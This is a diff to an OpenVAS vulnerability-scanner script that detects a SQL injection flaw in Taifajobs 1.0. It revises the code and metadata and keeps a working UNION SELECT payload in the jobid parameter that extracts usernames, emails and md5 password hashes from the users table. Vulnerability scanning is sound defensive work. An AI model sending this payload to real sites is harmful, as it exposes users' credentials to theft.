@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: taifajobs_1_0_jobid_sql_injection.nasl 5220 2017-02-07 11:42:33Z teissa $
+# $Id: taifajobs_1_0_jobid_sql_injection.nasl 5768 2017-03-29 13:37:01Z cfi $
 #
 # Taifajobs SQL-Injection Detection
 #
@@ -36,11 +36,11 @@ tag_summary = "This host is running Taifajobs.
 
 tag_impact = "Successful exploitation allows attacker retrieving users email,loginname and md5 hash password.";
 
-if (description)
+if(description)
 {
  script_id(100002);
- script_version("$Revision: 5220 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-07 12:42:33 +0100 (Tue, 07 Feb 2017) $");
+ script_version("$Revision: 5768 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 15:37:01 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-02-26 04:52:45 +0100 (Thu, 26 Feb 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -48,8 +48,8 @@ if (description)
  script_bugtraq_id(33864);
 
  script_name("Taifajobs SQL Injection Vulnerability");
- script_category(ACT_GATHER_INFO);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_category(ACT_ATTACK);
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -64,21 +64,20 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port)) exit(0);
 
-dir = make_list("/tjobs","/jobs", cgi_dirs());
+foreach dir( make_list_unique( "/tjobs", "/jobs", cgi_dirs( port:port ) ) ) { 
 
-foreach d (dir)
-{ 
- url = string(d, "/jobdetails.php?jobid=-5%20union%20select%2012345678987654321,2,3,4,5,6,concat(admin,0x23,email,0x5D,loginname,0x7E,pass),8,9,0,1,2,3,4,5,6,7,8,9,0%20from%20users--");
- req = http_get(item:url, port:port);
- buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
- if( buf == NULL )exit(0);
- if ( egrep(pattern:'value="12345678987654321"', string: buf) && ( buf =~ "[0-9]+.*#.*@.*\..*\].*~[a-f0-9]{32}" ) )
-   {    
-    security_message(port:port);
-    exit(0);
-   }
+  url = string(dir, "/jobdetails.php?jobid=-5%20union%20select%2012345678987654321,2,3,4,5,6,concat(admin,0x23,email,0x5D,loginname,0x7E,pass),8,9,0,1,2,3,4,5,6,7,8,9,0%20from%20users--");
+  req = http_get(item:url, port:port);
+  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
+  if( buf == NULL )continue;
+
+  if( egrep(pattern:'value="12345678987654321"', string: buf) && ( buf =~ "[0-9]+.*#.*@.*\..*\].*~[a-f0-9]{32}" ) ) {    
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
+
+exit( 99 );
